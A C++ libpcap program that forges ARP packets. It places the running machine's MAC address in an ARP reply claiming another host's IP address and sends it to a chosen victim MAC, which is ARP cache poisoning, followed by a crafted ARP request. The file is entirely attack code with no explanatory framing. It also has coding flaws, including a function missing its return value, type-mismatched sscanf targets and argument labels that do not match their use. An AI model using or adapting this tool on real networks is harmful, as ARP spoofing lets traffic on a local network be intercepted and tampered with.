#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

using namespace std;

#define PROMISCUOUS 1
#define	ETHERTYPE_ARP		0x0806

    struct ether_arp_hdr
    {
          unsigned char   	h_dest[6];	/* destination eth addr	*/
          unsigned char   	h_source[6];	/* source ether addr	*/
          unsigned short    h_proto;		/* packet type ID field	*/

          unsigned short int ar_hrd;		/* Format of hardware address.  */
          unsigned short int ar_pro;		/* Format of protocol address.  */
          unsigned char ar_hln;		/* Length of hardware address.  */
          unsigned char ar_pln;		/* Length of protocol address.  */
          unsigned short int ar_op;		/* ARP opcode (command).  */

          unsigned char __ar_sha[6];	/* Sender hardware address.  */
          unsigned char __ar_sip[4];		/* Sender IP address.  */
          unsigned char __ar_tha[6];	/* Target hardware address.  */
          unsigned char __ar_tip[4];		/* Target IP address.  */

    };

 char change_mac(char mac[], unsigned char *packet) {

     sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
 }


int main(int argc, char *argv[])
{
    pcap_t *pcd; // packet captuer descripter
    ether_arp_hdr *eth_arp_hdr;
    eth_arp_hdr = new ether_arp_hdr;


    if (argc != 7) {
        cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
        return -1;
    }


    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    cout << endl << "Device : " << dev << endl << endl;


    if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }

    // =========================================================

    cout << "Ethernet Destination : " << endl;
    change_mac(argv[5], eth_arp_hdr->h_dest);

    // =========================================================
    cout << "Ethernet Source : " << endl;
    int fd;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        cout << "socket error" << endl;
        return -1;
    }

    struct ifreq ifr;
    struct sockaddr_in *sin;

    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        cout << "Mac error" << endl;
        return -1;
    }

    cout << "-- My Mac address : ";
    for(int i=0; i<6; i++) {
    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
    eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    // =========================================================

    cout << endl << "Sender ip : " << endl;
    sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(argv[2]);
    memcpy(&eth_arp_hdr->__ar_sip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

    // =========================================================

    eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
    cout << "ether-type : " << eth_arp_hdr->h_proto << endl << endl;

    // ARP data
    eth_arp_hdr->ar_hrd = htons(0x0001);
    cout << "ar_hdr : " << eth_arp_hdr->ar_hrd << endl;
    eth_arp_hdr->ar_pro = htons(0x0800);
    cout << "ar_pro : " << eth_arp_hdr->ar_pro << endl;
    eth_arp_hdr->ar_hln = 0x06;
    cout << "ar_hln : " << eth_arp_hdr->ar_hln << endl;
    eth_arp_hdr->ar_pln = 0x04;
    cout << "ar_pln : " << eth_arp_hdr->ar_pln << endl;
    eth_arp_hdr->ar_op = htons(0x0002);
    cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;

    // =========================================================

    cout << "Sender mac : ";
    for(int i=0; i<6; i++) {
    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
    eth_arp_hdr->__ar_sha[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    cout << endl << "Target mac : " << endl;
    change_mac(argv[5], eth_arp_hdr->__ar_tha);

    // =========================================================

    cout << "Target ip : " << eth_arp_hdr->__ar_tip;
    addr.sin_addr.s_addr = inet_addr(argv[3]);
    memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

    // =========================================================

    if (pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
        cout << "Error packet" << endl;
        return -1;
    }
    else cout << endl << endl << "Reply Good" << endl;


    // Reply --------------------------------------- End


    cout << "Request Ethernet Destination : " << endl;
    change_mac(argv[5], eth_arp_hdr->h_dest);

    // -------------------

    cout << "Request Ethernet Source : " << endl;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        cout << "socket error" << endl;
        return -1;
    }

    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        cout << "Mac error" << endl;
        return -1;
    }

    cout << "-- My Mac address : ";
    for(int i=0; i<6; i++) {
    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
    eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    // -------------

    cout << endl << "Sender ip : " << endl;
    addr.sin_addr.s_addr = inet_addr(argv[2]);
    memcpy(&eth_arp_hdr->__ar_sip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

    // --------------
    eth_arp_hdr->ar_op = htons(0x0001);
    cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;

    // --------------

    cout << "Sender mac : ";
    for(int i=0; i<6; i++) {
    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
    eth_arp_hdr->__ar_sha[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    cout << endl << "Target mac : " << endl;
    memset(eth_arp_hdr->__ar_tha, 0, sizeof(eth_arp_hdr->__ar_tha));
   // change_mac(uni, eth_arp_hdr->__ar_tha);

    // =========================================================

    cout << "Target ip : " << eth_arp_hdr->__ar_tip;
    addr.sin_addr.s_addr = inet_addr(argv[6]);
    memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));



    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
            cout << "Error packet" << endl;
            return -1;
    }
    else cout << endl << endl << "Request Good" << endl;
}



